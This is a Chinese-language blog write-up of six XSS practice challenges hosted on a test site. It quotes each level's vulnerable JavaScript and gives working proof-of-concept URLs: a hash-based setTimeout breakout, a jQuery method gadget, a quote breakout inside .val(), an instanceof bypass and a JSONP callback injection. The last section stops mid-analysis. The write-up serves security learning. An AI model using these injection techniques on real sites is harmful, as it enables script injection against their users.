### 说明

此篇记录在先知社区，xss 几道题目实际学习过程中遇到的问题，对于一个对前端不太了解的人来说还是有很大的挑战的。

对应的题目的链接地址：https://xz.aliyun.com/t/7909

## 1.题目一

题目的地址http://px1624.sinaapp.com/test/xsstest1/

开篇就一个显示：

![image-20220912114534042](https://gitee.com/shine05/myblog-gallery/raw/master/img/image-20220912114534042.png)

打开源码发现对应的逻辑也比较简单

```js
<script type="text/javascript">
var x=location.hash;
function aa(x){};
setTimeout("aa('"+x+"')",100);
</script>
Give me xss bypass 1~
```

尝试一把后就有点懵，输入对应的内容就直接跳转到对应的url，服务找不到。

![image-20220912114828933](https://gitee.com/shine05/myblog-gallery/raw/master/img/image-20220912114828933.png)

查看相关的文档，发现在url中添加`#` 号可以解决这个问题。



#### 知识点：url中的 #的作用和意义

- **井号在URL中指定的是页面中的一个位置**

 	井号作为页面定位符出现在URL中，比如：*http://www.httpwatch.com/features.htm#print* ，此URL表示在页面features.htm中print的位置。浏览器读取这个URL后，会自动将print位置滚动至可视区域。

- **井号后面的数据不会发送到HTTP请求中**

  当时使用类似HttpWatch工具时，你是无法在Http请求中找到井号后面的参数的，原因是井号后面的参数是针对浏览器起作用的而不是服务器端。

- **任务位于井号后面的字符都是位置标识符**

​	不管第一个井号后面跟的是什么参数，只要是在井号后面的参数一律看成是位置标识符。

​	比如这样一个链接（*http://example.com/?color=#ffff&shape=circle*），后面跟的参数是颜色和形状，但是服务器却并不能理解URL中的含义

-  **改变井号后面的参数不会触发页面的重新加载但是会留下一个历史记录**

​	仅改变井号后面的内容，只会使浏览器滚动到相应的位置，并不会重现加载页面。

​	比如从*http://www.httpwatch.com/features.htm#filter*到*http://www.httpwatch.com/features.htm#print*， 浏览器并不会去重新请求页面，但是此操作会在浏览器的历史记录中添加一次记录，即你可以通过返回按钮回答上次的位置。这个特性对Ajax来说特别的有用， 可以通过设置不同井号值，来表示不同的访问状态，并返回不同的内容给用户。

- **可以通过javascript使用window.location.hash来改变井号后面的值**

​	window.location.hash这个属性可以对URL中的井号参数进行修改。

**既然知道了可以通过`#`号来进行，那现在就开始吧**

![image-20220912115959521](https://gitee.com/shine05/myblog-gallery/raw/master/img/image-20220912115959521.png)

x的值直接可以从url中获取。

setTimeout函数，本身就具有弹框的功能，因此可以进行构造，绕过`'`的限制即可。

**poc如下**

https://px1624.sinaapp.com/test/xsstest1/#1111');alert(1);('1xxx

![image-20220912120135759](https://gitee.com/shine05/myblog-gallery/raw/master/img/image-20220912120135759.png)

## 2.题目二

题目地址：[px1624.sinaapp.com/test/xsstest2/](http://px1624.sinaapp.com/test/xsstest2/)

![image-20220916211946183](https://gitee.com/shine05/myblog-gallery/raw/master/img/image-20220916211946183.png)

然后查看对应的源码

```javascript

<html>
<head>
<script src="./jquery-3.4.1.min.js"></script>
Give me xss bypass 2~
<div style='display:none' id='xx'>&lt;img src=x onerror=alert(1)&gt;</div>
<input type='button' value='test' onclick='alert("鍝堝搱锛岀偣杩欑帺鎰忔病鍟ョ敤鐨勶紒")'>
<body>
<script>
   var query = window.location.search.substring(1);
   var vars = query.split("&");
   if(vars){
		aa(vars[0],vars[1])
   }
   	function aa(x,y){
		$("#xx")[x]($("#xx")[y]());
	}
</script>
</body>
</html>
```



在控制台中输入下述内容，可以看到可以获取到对应的id=xx 的内容

![image-20220916212424539](https://gitee.com/shine05/myblog-gallery/raw/master/img/image-20220916212424539.png)

通过下述的内容也可以取出来对应的值

![image-20220916213301693.png](https://gitee.com/shine05/myblog-gallery/raw/master/img/image-20220916213301693.png)

然后给对应的xx id赋值，就可以弹框了

![image-20220916213506579](https://gitee.com/shine05/myblog-gallery/raw/master/img/image-20220916213506579.png)



也可以这么写：`$("#xx")["html"]($("#xx")["text"]());`

注：`var query = window.location.search.substring(1);`

这个语句的意思是取得url中`？`号后面的字符

结合源码中的

```
 var query = window.location.search.substring(1);
   var vars = query.split("&");
   if(vars){
		aa(vars[0],vars[1])
   }
   	function aa(x,y){
		$("#xx")[x]($("#xx")[y]());
	}
```

因此利用function aa 即可弹框。因此在url 中输入html&text

![image-20220916214523729](https://gitee.com/shine05/myblog-gallery/raw/master/img/image-20220916214523729.png)





## 3 题目三

题目地址：[px1624.sinaapp.com/test/xsstest3/](http://px1624.sinaapp.com/test/xsstest3/)

页面信息

![image-20220916224410180](https://gitee.com/shine05/myblog-gallery/raw/master/img/image-20220916224410180.png)

查看源码信息

```javascript

Give me xss bypass 3~
<script src="./jquery-3.4.1.min.js"></script>
<script>
    $(function test() {
		var px = '';
		if (px != "") {
			$('xss').val('');
		}
	})
</script>
```

随意输入字符：

![image-20220916224520912](https://gitee.com/shine05/myblog-gallery/raw/master/img/image-20220916224520912.png)

看着像是要闭合`'`字符了

测试过程中发现闭合后出现错误

![image-20220916224633997](https://gitee.com/shine05/myblog-gallery/raw/master/img/image-20220916224633997.png)

在菜鸟教程找了下val的说明

![image-20220916224745020](https://gitee.com/shine05/myblog-gallery/raw/master/img/image-20220916224745020.png)

这个图可以说明问题，val中应该是个字符串，因此得添加对应的字符串连接符

重新输入字符串链接符号，问题解决

![image-20220916224858805](https://gitee.com/shine05/myblog-gallery/raw/master/img/image-20220916224858805.png)

## 4 题目4 

题目4的地址：[px1624.sinaapp.com/test/xsstest4/](http://px1624.sinaapp.com/test/xsstest4/)

![image-20220917095405634](https://gitee.com/shine05/myblog-gallery/raw/master/img/image-20220917095405634.png)

查看源码信息：

```javascript
Give me xss bypass 4~
<script src="./jquery-3.4.1.min.js"></script>
<script>
    $(function test() {
		var px = '';
		if (px != "") {
			$('xss').val('');
		}
	})
</script>
```



看起来和题目三一样，但是坐着给出的解析内容看，将一些内容做了过滤

![image-20220917095530558](https://gitee.com/shine05/myblog-gallery/raw/master/img/image-20220917095530558.png)

因此这个需要进行绕过对应的特殊字符，根据作者的提示，访问：https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference#%E5%85%B3%E7%B3%BB%E8%BF%90%E7%AE%97%E7%AC%A6

该网站列出了对应的运算符的方法：

![image-20220917170654130](https://gitee.com/shine05/myblog-gallery/raw/master/img/image-20220917170654130.png)

因此咱们选择`instanceof`尝试下，对应的poc如下：http://px1624.sinaapp.com/test/xsstest4/?px=111'instanceof alert(1) instanceof'11

![image-20220917170811668](https://gitee.com/shine05/myblog-gallery/raw/master/img/image-20220917170811668.png)

可以正常的触发该poc~

## 5 题目5

这题是真的不会，记录下答案

![image-20220918110858329](https://gitee.com/shine05/myblog-gallery/raw/master/img/image-20220918110858329.png)

callback可以设置成任意的字符

![image-20220918110938446](https://gitee.com/shine05/myblog-gallery/raw/master/img/image-20220918110938446.png)

查看源码也未找到其他的有用信息，根据作者给出的思路，可以通过查看，[view-source:px1624.sinaapp.com/test/xsstest5/](view-source:http://px1624.sinaapp.com/test/xsstest5/) 找到对应的源码信息：

![image-20220918111023710](https://gitee.com/shine05/myblog-gallery/raw/master/img/image-20220918111023710.png)

在源码中可以看到会从url中获取两个参数，uin，pn 这两个参数，并且通过document.write写到页面上，因此如果该脚本的src的页面引用如果可控，则可以造成xss漏洞。

```javascript
var orguin = $.Tjs_Get('uin');
var pagenum= $.Tjs_Get('pn');
if(orguin<=0) window.location="./user.php?callback=Give me xss bypass~";
document.write('<script type="text/javascript" 	src="http://px1624.sinaapp.com/'+orguin+'?'+pagenum+'"><\/script>');
```

但是没有给出上述的两个方法：` $.Tjs_Get`的对应的代码，可以调试下看下，发现输入该方法仅仅是做了返回输入的内容。

根据上述步骤说的callback构造成alert(1)后，利用方式如下：`?uin=test/xsstest5/user.php&pn=callback=alert(1)`



![image-20220918211029632](https://gitee.com/shine05/myblog-gallery/raw/master/img/image-20220918211029632.png)

![image-20220918211200909](https://gitee.com/shine05/myblog-gallery/raw/master/img/image-20220918211200909.png)

## 6 题目6



对应的代码如下：

```javascript
		// 得到地址栏中的参数值 变量分大小写
		Tjs_Get:function(parmtname){
			//var SERVER_TEMP			= $.Tjs_HtmlEncode(window.location.search.replace(/.*\?/,"")); //HtmlEncode 进行安全验证

			
			var sl = location.href.indexOf('&');
			var hl = location.href.indexOf('#');
			var str = '';
			if ((sl < 0 || sl > hl) && hl > 0) str = location.hash.substr(1);
			else str = location.search.substr(1);
			
			str=str.replace(/%/g,"");
			//var SERVER_TEMP = str;
			var SERVER_TEMP			= $.Tjs_HtmlEncode(str.replace(/.*\?/,"")); //HtmlEncode 进行安全验证

			var PAGE_PARMT_ARRAY	= SERVER_TEMP.split("&amp;");
			if(PAGE_PARMT_ARRAY.length==0) return "";
			var value="";
			for(var i=0;i<PAGE_PARMT_ARRAY.length;i++){
				if(PAGE_PARMT_ARRAY[i]=="") continue;
				var GETname = PAGE_PARMT_ARRAY[i].substr(0,PAGE_PARMT_ARRAY[i].indexOf("="));
				if(GETname == parmtname){
					value = PAGE_PARMT_ARRAY[i].substr((PAGE_PARMT_ARRAY[i].indexOf("=")+1),PAGE_PARMT_ARRAY[i].length);
					return value;
					break;
				}
			}
			return "";
		},
```

结合主页面的代码：`if(orguin<=0) window.location="./user.php?callback=Give me xss bypass~";`

因此如果要能调用到index.js 需要在http://px1624.sinaapp.com/test/xsstest5/ 页面进行操作，并且传递的内容`?xxxx`需要确保`orguin`的内容不能为空才行，否则会直接调转到`./user.php?callback=Give me xss bypass~`页面。

js当中的几个函数：

`str=str.replace(/%/g,"");` 替换掉url中的`%`号

`var SERVER_TEMP = $.Tjs_HtmlEncode(str.replace(/.*\?/,""));` 替换字符串中`?`前的字符比如：`xxfw?abd`-->`abd`

`var PAGE_PARMT_ARRAY	= SERVER_TEMP.split("&amp;");` url中必须要包含`&` 否则返回的`if(PAGE_PARMT_ARRAY.length==0) return ""`

`location.hash.substr(1)`获取url后面的`#`后面的内容

`location.search.substr(1)`	获取`?`后面的内容



根据上述的内容，因此构造该xss的几个必要条件如下：

- 为了调用index.js 需要在http://px1624.sinaapp.com/test/xsstest5/ 后续构造?uin=xxxx形式
- str内容-->先判断是否包含`?`的内容后面的取出来-->判断是否包含`&`，取出后面的内容



